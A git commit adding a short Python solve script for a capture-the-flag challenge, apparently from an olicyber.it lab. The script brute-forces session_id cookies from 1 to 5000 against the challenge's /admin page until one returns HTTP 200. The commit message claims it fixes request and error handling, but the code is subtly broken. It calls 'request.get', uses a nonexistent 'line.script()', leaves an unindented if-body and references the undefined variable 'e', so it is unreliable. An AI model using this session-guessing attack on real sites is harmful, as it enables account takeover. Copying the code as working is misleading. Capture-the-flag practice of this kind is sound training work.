5ce3aa7f7e147f8bca893863e757ee81d2d8ee2b
gith-eng <135365698+gith-eng@users.noreply.github.com>
2026-09-23 11:18:16 +0200

    Update solve.py to fix request and error handling
    Fixes the request method and error handling in the script.

---
+++ lab2/aTooSmallReminder/solve.py
@@ -0,0 +1,22 @@
+import requests
+
+URL= "http://too-small-reminder.challs.olicyber.it/admin"
+
+START=1
+END=5000
+
+for session_id in range(START, END, 1):
+  cookies = {"session_id": str(session_id)}
+
+  try:
+    r = request.get(URL, cookies=cookies, timeout=5)
+    status = r.status_code
+    line = f"session_id={session_id} | status={status}"
+    print(line.script())
+
+    if status == 200: 
+    print(f"Cookie: {session_id}")
+    break
+
+  except Exception as err:
+    print(f"errore: {e}")
